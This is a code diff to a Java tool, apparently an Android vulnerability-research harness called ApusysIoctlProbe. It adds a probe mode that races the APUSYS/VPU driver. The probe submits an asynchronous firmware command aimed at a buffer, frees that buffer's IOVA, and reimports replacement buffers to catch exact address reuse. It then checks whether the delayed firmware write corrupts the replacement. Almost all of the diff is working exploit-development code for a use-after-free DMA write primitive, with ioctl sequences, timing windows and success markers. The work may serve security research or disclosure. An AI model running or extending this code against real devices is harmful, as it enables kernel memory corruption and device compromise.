@@ -529,6 +529,7 @@ public final class ApusysIoctlProbe {
         boolean runCmdVpuXrpMemFreeRaceCompletedIova = false;
         boolean runCmdVpuXrpMemFreeRaceCompletedReuseIova = false;
         boolean runCmdVpuXrpMemFreeRaceCompletedGapReuseIova = false;
+        boolean runCmdVpuXrpPlaneRedirectGapReuseIova = false;
         boolean runCmdVpuXrpDevCtrlRaceIova = false;
         boolean runCmdVpuXrpDevCtrlMatrixIova = false;
         boolean runCmdVpuXrpTwoCommandSharedIova = false;
@@ -773,6 +774,8 @@ public final class ApusysIoctlProbe {
                 runCmdVpuXrpMemFreeRaceCompletedReuseIova = true;
             } else if ("--run-cmd-vpu-xrp-mem-free-race-completed-gap-reuse-iova".equals(arg)) {
                 runCmdVpuXrpMemFreeRaceCompletedGapReuseIova = true;
+            } else if ("--run-cmd-vpu-xrp-plane-redirect-gap-reuse-iova".equals(arg)) {
+                runCmdVpuXrpPlaneRedirectGapReuseIova = true;
             } else if ("--run-cmd-vpu-xrp-dev-ctrl-race-iova".equals(arg)) {
                 runCmdVpuXrpDevCtrlRaceIova = true;
             } else if ("--run-cmd-vpu-xrp-dev-ctrl-matrix-iova".equals(arg)) {
@@ -944,6 +947,7 @@ public final class ApusysIoctlProbe {
                 || runCmdVpuXrpMemFreeRaceCompletedIova
                 || runCmdVpuXrpMemFreeRaceCompletedReuseIova
                 || runCmdVpuXrpMemFreeRaceCompletedGapReuseIova
+                || runCmdVpuXrpPlaneRedirectGapReuseIova
                 || runCmdVpuXrpDevCtrlRaceIova
                 || runCmdVpuXrpDevCtrlMatrixIova
                 || runCmdVpuXrpTwoCommandSharedIova
@@ -1550,6 +1554,10 @@ public final class ApusysIoctlProbe {
 
             if (runCmdVpuXrpMemFreeRaceCompletedGapReuseIova) {
                 runRunCmdVpuXrpMemFreeRaceCompletedGapReuseHardwareBufferProbe();
+            }
+
+            if (runCmdVpuXrpPlaneRedirectGapReuseIova) {
+                runRunCmdVpuXrpPlaneRedirectGapReuseHardwareBufferProbe();
             }
 
             if (runCmdVpuXrpDevCtrlRaceIova) {
@@ -5000,6 +5008,334 @@ public final class ApusysIoctlProbe {
             + " first_exact_hist="
             + nonZeroHistogram(firstExactIndexHistogram)
             + " exact_hist=" + nonZeroHistogram(exactIndexHistogram));
+    }
+
+    // -----------------------------------------------------------------------
+    // Plane-redirect + target/lower IOVA gap reuse probe (Action 4)
+    //
+    // Background: firmware iDMA timing analysis (2026-06-15) shows the
+    // completed XTENSA_ANN_VERSION write path is synchronous and sub-Java-
+    // latency.  The descriptor-plane redirect path ends in ~9 s timeout/EIO
+    // but still writes the first dword of the imported plane window
+    // (PLN0 -> PLN1).  This is the only identified firmware write path that
+    // is *slower* than the Java mem_free round-trip (~2 ms).
+    //
+    // Probe shape (per iteration):
+    //   1. Import 64K plane-target pool (poolCount buffers).
+    //   2. Find adjacent target/lower pair (target_then_lower free order).
+    //   3. Fill plane-target buffer with XRP plane-redirect settings;
+    //      pre-mark plane payload area (planeTargetIova + 0x700) = PLN0.
+    //   4. Import cmd buffer (4K) pointing at planeTargetIova as shared buf.
+    //   5. run_cmd_async -> firmware starts writing PLN0->PLN1 at
+    //      planeTargetIova + 0x700, times out in ~9 s.
+    //   6. mem_free(planeTargetIova) then mem_free(lowerIova).
+    //   7. Import precreated replacements -> check exact IOVA reuse.
+    //   8. Sleep 12 s (firmware timeout window + margin).
+    //   9. Check replacement at byte offset 0x700 for PLN1 marker (0x504c4e31).
+    //  10. wait_cmd.
+    //
+    // Success signal: replacement.iova == planeTargetIova AND
+    //   getU32LE(replacement, XRP_NZ_PLANE_PAYLOAD_OFF) == 0x504c4e31.
+    // -----------------------------------------------------------------------
+
+    // Plane marker constants
+    private static final int PLANE_MARKER_PLN0 = 0x504c4e50; // "PLN0" LE
+    private static final int PLANE_MARKER_PLN1 = 0x504c4e31; // "PLN1" LE
+
+    private static void runRunCmdVpuXrpPlaneRedirectGapReuseHardwareBufferProbe()
+            throws Exception {
+        System.out.println("\n[*] === APUSYS run_cmd VPU plane-redirect"
+            + " gap-reuse probe ===");
+        System.out.println("[*] Mode: descriptor plane-redirect (~9s timeout/EIO"
+            + " write path) + target_then_lower 64K allocator gap."
+            + " Plane target = separate 64K pool buffer freed after run_async."
+            + " Success: replacement[0x700] == 0x504c4e31 (PLN1).");
+        loadRuntimeLibraries();
+        // Best allocator baseline: 64K p16/r8, first adjacent pair.
+        runPlaneRedirectGapReuseCase(0x10000, 16, 8, 30);
+        runPlaneRedirectGapReuseCase(0x10000, 12, 8, 20);
+    }
+
+    private static void runPlaneRedirectGapReuseCase(
+            int importSize, int poolCount, int replacementCount,
+            int iterations) throws Exception {
+        // plane-redirect settings shape: VPU_DESC_LIBVPU_SETTINGS5 with
+        // planeValid overlay pointing plane MVA to sharedIova + 0x700.
+        VpuDescriptorPlaneOverride planeValidOverride =
+            new VpuDescriptorPlaneOverride(
+                XRP_NZ_PLANE_PAYLOAD_OFF,  // planeMvaOffset = 0x700
+                XRP_PLANE_PAYLOAD_SIZE,    // word20 (plane size)
+                0,                         // word24
+                XRP_PLANE_PAYLOAD_SIZE,    // word28 (stride)
+                0,                         // word34
+                1,                         // byte38 (plane_count = 1)
+                0, 0, 0);
+        XrpSettingsShape planeShape = new XrpSettingsShape(
+            "plane_redirect_gap",
+            XRP_OUTPUT_SIZE_WRAPPER_DEFAULT,
+            XRP_DATA_DESC_SIZE,
+            true,
+            planeValidOverride);
+
+        int pairFound = 0;
+        int noPair = 0;
+        int runOk = 0;
+        int exactTargetTotal = 0;
+        int exactTargetIterations = 0;
+        int plnHits = 0;
+        int waitOk = 0;
+        int waitEio = 0;
+        int importFailTotal = 0;
+        int[] firstExactHist = new int[replacementCount];
+        int[] exactHist      = new int[replacementCount];
+
+        // Pre-create replacements outside the loop for tighter race timing.
+        ReplacementImport[] replacements = createProfilerHardwareBufferPool(
+            replacementCount, importSize, "plane_redir_repl_precreated");
+
+        for (int iter = 0; iter < iterations; iter++) {
+            int raceFd = -1;
+            ReplacementImport[] pool = null;
+            ReplacementImport cmd = null;
+            boolean[] poolImported = new boolean[poolCount];
+            boolean[] replImported = new boolean[replacementCount];
+            try {
+                raceFd = DrmTrigger.openDev(APUSYS_DEV);
+
+                // ----------------------------------------------------------
+                // 1. Import plane-target pool
+                // ----------------------------------------------------------
+                pool = createProfilerHardwareBufferPool(poolCount, importSize,
+                    "plane_redir_pool_" + iter);
+                int poolFailures = 0;
+                for (int pi = 0; pi < poolCount; pi++) {
+                    long md = DrmTrigger.sScratchBuf
+                        + OFF_MEM_REUSE_BASE + (pi * OFF_MEM_REUSE_STRIDE);
+                    long r = importProfilerMem(raceFd, pool[pi], md,
+                        importSize, "plane_redir_pool_" + pi, false);
+                    if (r >= 0) poolImported[pi] = true;
+                    else        poolFailures++;
+                }
+
+                // ----------------------------------------------------------
+                // 2. Find target + lower adjacent pair
+                // ----------------------------------------------------------
+                int targetIdx = findGapProfilerTarget(pool, importSize);
+                int lowerIdx  = targetIdx >= 0
+                    ? findExactLowerNeighbor(pool, targetIdx, importSize)
+                    : -1;
+                if (targetIdx < 0 || lowerIdx < 0) {
+                    noPair++;
+                    System.out.println("[*] plane_redir_iter iter=" + iter
+                        + " adjacent_pair=none pool_fail=" + poolFailures
+                        + " pool_iovas=" + profilerIovaList(pool));
+                    continue;
+                }
+                pairFound++;
+
+                int planeTargetIova = pool[targetIdx].iovaLow;
+                int planeLowerIova  = pool[lowerIdx].iovaLow;
+
+                // ----------------------------------------------------------
+                // 3. Fill plane-target buffer with XRP plane-redirect settings
+                //    and pre-mark plane payload area (PLN0 at offset 0x700).
+                // ----------------------------------------------------------
+                fillGapSharedSettings(pool[targetIdx], planeTargetIova,
+                    importSize, planeShape);
+                setPlaneTargetMarker(pool[targetIdx],
+                    XRP_NZ_PLANE_PAYLOAD_OFF, PLANE_MARKER_PLN0);
+                dumpGapSharedBuffer("before", pool[targetIdx], planeTargetIova);
+
+                // ----------------------------------------------------------
+                // 4. Import cmd buffer (4K) pointing at planeTargetIova.
+                // ----------------------------------------------------------
+                long cmdMemDesc = DrmTrigger.sScratchBuf + OFF_MEM_B;
+                cmd = createTwoCommandXrpCommandBuffer(raceFd, 1, cmdMemDesc,
+                    planeTargetIova, importSize, true, planeShape,
+                    "plane_redir_" + iter);
+
+                System.out.println("[*] plane_redir_iter iter=" + iter
+                    + " cmd=0x" + Integer.toHexString(cmd.iovaLow)
+                    + " plane_target=0x" + Integer.toHexString(planeTargetIova)
+                    + " plane_lower=0x"  + Integer.toHexString(planeLowerIova)
+                    + " pool_fail=" + poolFailures);
+
+                // ----------------------------------------------------------
+                // 5. Submit async.  Firmware writes PLN1 at
+                //    planeTargetIova + 0x700, ends in ~9s timeout.
+                // ----------------------------------------------------------
+                long runCmd = DrmTrigger.sScratchBuf + OFF_RUN_CMD;
+                long runRet = submitRunCmdAsync(raceFd, runCmd, cmd.dmaBufFd,
+                    "plane_redir_iter_" + iter);
+                if (runRet >= 0) runOk++;
+
+                // ----------------------------------------------------------
+                // 6. Free plane target + lower (target_then_lower).
+                // ----------------------------------------------------------
+                long targetMd = DrmTrigger.sScratchBuf + OFF_MEM_REUSE_BASE
+                    + (targetIdx * OFF_MEM_REUSE_STRIDE);
+                long lowerMd  = DrmTrigger.sScratchBuf + OFF_MEM_REUSE_BASE
+                    + (lowerIdx  * OFF_MEM_REUSE_STRIDE);
+                long targetFreeRet = freeProfilerMem(raceFd, pool[targetIdx],
+                    targetMd, "plane_redir_target", true);
+                if (targetFreeRet >= 0) poolImported[targetIdx] = false;
+                long lowerFreeRet  = freeProfilerMem(raceFd, pool[lowerIdx],
+                    lowerMd,  "plane_redir_lower",  true);
+                if (lowerFreeRet  >= 0) poolImported[lowerIdx]  = false;
+
+                // ----------------------------------------------------------
+                // 7. Import replacements; check exact IOVA reuse.
+                // ----------------------------------------------------------
+                int exactTargetThis = 0;
+                int importFailThis  = 0;
+                int firstExactIdx   = -1;
+                boolean[] exactRepl = new boolean[replacementCount];
+                for (int ri = 0; ri < replacementCount; ri++) {
+                    long md = DrmTrigger.sScratchBuf + OFF_MEM_REUSE_BASE
+                        + ((poolCount + ri) * OFF_MEM_REUSE_STRIDE);
+                    long r = importProfilerMem(raceFd, replacements[ri], md,
+                        importSize, "plane_redir_repl_" + ri, false);
+                    if (r < 0) { importFailThis++; continue; }
+                    replImported[ri] = true;
+                    if (replacements[ri].iovaLow == planeTargetIova) {
+                        exactRepl[ri] = true;
+                        exactTargetThis++;
+                        exactHist[ri]++;
+                        if (firstExactIdx < 0) {
+                            firstExactIdx = ri;
+                            firstExactHist[ri]++;
+                        }
+                        dumpReplacementImport("plane_redir_exact_before_wait",
+                            replacements[ri], planeTargetIova, XRP_OP_ANN_VERSION);
+                    }
+                }
+                System.out.println("[*] plane_redir_iter iter=" + iter
+                    + " run_async=" + retText(runRet)
+                    + " target_free=" + retText(targetFreeRet)
+                    + " lower_free="  + retText(lowerFreeRet)
+                    + " exact_target=" + exactTargetThis + "/"
+                    + replacementCount
+                    + " first_exact_idx=" + firstExactIdx
+                    + " import_fail=" + importFailThis);
+
+                // ----------------------------------------------------------
+                // 8. Sleep through firmware timeout (~9s) + margin.
+                // ----------------------------------------------------------
+                Thread.sleep(12000);
+
+                // ----------------------------------------------------------
+                // 9. Check replacement at offset 0x700 for PLN1 marker.
+                // ----------------------------------------------------------
+                int plnHitsThis = 0;
+                for (int ri = 0; ri < replacementCount; ri++) {
+                    if (!exactRepl[ri]) continue;
+                    boolean plnHit = replacementHasPlnMarker(
+                        replacements[ri], XRP_NZ_PLANE_PAYLOAD_OFF,
+                        PLANE_MARKER_PLN1);
+                    if (plnHit) plnHitsThis++;
+                    System.out.println("[*] plane_redir_exact_result iter=" + iter
+                        + " repl=" + ri
+                        + " pln_hit=" + (plnHit ? "1" : "0"));
+                    dumpReplacementImport("plane_redir_exact_after_wait",
+                        replacements[ri], planeTargetIova, XRP_OP_ANN_VERSION);
+                }
+
+                // ----------------------------------------------------------
+                // 10. wait_cmd.
+                // ----------------------------------------------------------
+                if (runRet >= 0) {
+                    long waitRet = DrmTrigger.rawIoctl(raceFd,
+                        APUSYS_CMD_WAIT, runCmd);
+                    System.out.println("[*] wait_plane_redir_iter_" + iter
+                        + " ret=" + retText(waitRet));
+                    dumpU32Words("run_cmd_arg_plane_redir_" + iter
+                        + "_after_wait", runCmd, 0x18);
+                    if (waitRet == 0)  waitOk++;
+                    else if (waitRet == -5) waitEio++;
+                }
+
+                exactTargetTotal += exactTargetThis;
+                importFailTotal  += importFailThis;
+                plnHits          += plnHitsThis;
+                if (exactTargetThis > 0) exactTargetIterations++;
+
+            } finally {
+                if (raceFd >= 0) {
+                    for (int ri = 0; ri < replacementCount; ri++) {
+                        if (!replImported[ri]) continue;
+                        long md = DrmTrigger.sScratchBuf + OFF_MEM_REUSE_BASE
+                            + ((poolCount + ri) * OFF_MEM_REUSE_STRIDE);
+                        freeProfilerMem(raceFd, replacements[ri], md,
+                            "plane_redir_repl_cleanup_" + ri, false);
+                        replImported[ri] = false;
+                    }
+                    freeProfilerMem(raceFd, cmd,
+                        DrmTrigger.sScratchBuf + OFF_MEM_B,
+                        "plane_redir_cmd_cleanup", true);
+                    if (pool != null) {
+                        for (int pi = 0; pi < poolCount; pi++) {
+                            if (!poolImported[pi]) continue;
+                            long md = DrmTrigger.sScratchBuf + OFF_MEM_REUSE_BASE
+                                + (pi * OFF_MEM_REUSE_STRIDE);
+                            freeProfilerMem(raceFd, pool[pi], md,
+                                "plane_redir_pool_cleanup_" + pi, false);
+                        }
+                        closeProfilerBufferPool(pool);
+                    }
+                    DrmTrigger.closeFd(raceFd);
+                }
+            }
+        }
+
+        closeProfilerBufferPool(replacements);
+
+        int totalReplImports = pairFound * replacementCount;
+        System.out.println("[+] gap_plane_redirect_summary"
+            + " size=0x"      + Integer.toHexString(importSize)
+            + " pool="        + poolCount
+            + " replacements=" + replacementCount
+            + " iterations="  + iterations
+            + " pair_found="  + pairFound  + "/" + iterations
+            + " no_pair="     + noPair
+            + " run_ok="      + runOk
+            + " exact_target_iterations=" + exactTargetIterations
+                + "/" + pairFound
+            + " exact_target_total=" + exactTargetTotal
+                + "/" + totalReplImports
+            + " pln_hits="    + plnHits
+            + " wait_ok="     + waitOk
+            + " wait_eio="    + waitEio
+            + " import_fail_total=" + importFailTotal
+            + " first_exact_hist="  + nonZeroHistogram(firstExactHist)
+            + " exact_hist="        + nonZeroHistogram(exactHist));
+    }
+
+    /** Write a 32-bit marker to a specific byte offset within a pool buffer's
+     *  first image plane so we can detect firmware overwrites. */
+    private static void setPlaneTargetMarker(ReplacementImport buf,
+                                             int offset, int marker) {
+        if (buf == null || buf.output == null) return;
+        try {
+            android.media.Image.Plane[] planes = buf.output.getPlanes();
+            if (planes == null || planes.length == 0) return;
+            putU32LE(planes[0].getBuffer(), offset, marker);
+        } catch (Throwable ignored) {}
+    }
+
+    /** Returns true if a replacement buffer's dword at the given byte offset
+     *  matches the expected marker (e.g., PLN1 = 0x504c4e31), indicating the
+     *  firmware wrote to the replacement after exact IOVA reuse. */
+    private static boolean replacementHasPlnMarker(ReplacementImport repl,
+                                                    int offset,
+                                                    int expectedMarker) {
+        if (repl == null || repl.output == null) return false;
+        try {
+            android.media.Image.Plane[] planes = repl.output.getPlanes();
+            if (planes == null || planes.length == 0) return false;
+            return getU32LE(planes[0].getBuffer(), offset) == expectedMarker;
+        } catch (Throwable t) {
+            return false;
+        }
     }
 
     private static void runRunCmdVpuXrpDevCtrlRaceHardwareBufferProbe()
